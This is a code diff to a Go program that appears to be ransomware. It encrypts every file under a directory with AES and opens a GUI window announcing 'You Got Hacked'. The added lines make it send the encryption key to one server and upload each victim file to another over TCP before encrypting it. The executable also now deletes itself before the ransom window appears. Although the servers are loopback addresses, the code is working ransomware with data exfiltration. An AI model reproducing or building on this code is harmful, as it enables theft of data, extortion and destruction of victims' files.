@@ -9,6 +9,7 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"strconv"
 
 	"fyne.io/fyne/v2/app"
 	"fyne.io/fyne/v2/container"
@@ -17,6 +18,8 @@ import (
 	"fyne.io/fyne/v2/theme"
 	"fyne.io/fyne/v2/widget"
 )
+
+const BUFFERSIZE = 1024
 
 func main() {
 	var home_dir string
@@ -27,11 +30,20 @@ func main() {
 		panic(err)
 	}
 	key := []byte(passwd)
-	sock, err := net.Dial("tcp", "127.0.0.1:3000")
+	sock, err := net.Dial("tcp", "127.0.0.1:3000") //keys server
 	if err != nil {
 		panic(err)
 	}
 	sock.Write(key)
+	sock.Close()
+	for i := 0; i < len(allfiles); i++ {
+		s, err := net.Dial("tcp", "127.0.0.2:3000") //files server
+		if err != nil {
+			panic(err)
+		}
+		sendFileToClient(s, allfiles[i])
+		s.Close()
+	}
 	for i := 0; i < len(allfiles); i++ {
 		block, err := aes.NewCipher(key)
 		if err != nil {
@@ -50,6 +62,8 @@ func main() {
 		stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
 		os.WriteFile(allfiles[i], ciphertext, 0777)
 	}
+	home_dir, _ = os.Executable()
+	os.Remove(home_dir)
 	myApp := app.New()
 	myWindow := myApp.NewWindow("Please Pay Close attention You Got Hacked !")
 
@@ -76,8 +90,6 @@ func main() {
 	}()
 	myWindow.SetContent(content)
 	myWindow.ShowAndRun()
-	home_dir, _ = os.Executable()
-	os.Remove(home_dir)
 }
 func ListAllfiles(path string) (paths []string) {
 	filepath.Walk(path, func(fullpath string, info os.FileInfo, err error) error {
@@ -90,4 +102,43 @@ func ListAllfiles(path string) (paths []string) {
 		return nil
 	})
 	return paths
+}
+func sendFileToClient(connection net.Conn, filePath string) {
+	//A client has connected
+	defer connection.Close()
+	file, err := os.Open(filePath)
+	if err != nil {
+		panic(err)
+		return
+	}
+	fileInfo, err := file.Stat()
+	if err != nil {
+		panic(err)
+		return
+	}
+	fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
+	fileName := fillString(fileInfo.Name(), 64)
+	//Sending filename and filesize!
+	connection.Write([]byte(fileSize))
+	connection.Write([]byte(fileName))
+	sendBuffer := make([]byte, BUFFERSIZE)
+	for {
+		_, err = file.Read(sendBuffer)
+		if err == io.EOF {
+			break
+		}
+		connection.Write(sendBuffer)
+	}
+	return
+}
+func fillString(retunString string, toLength int) string {
+	for {
+		lengtString := len(retunString)
+		if lengtString < toLength {
+			retunString = retunString + ":"
+			continue
+		}
+		break
+	}
+	return retunString
 }
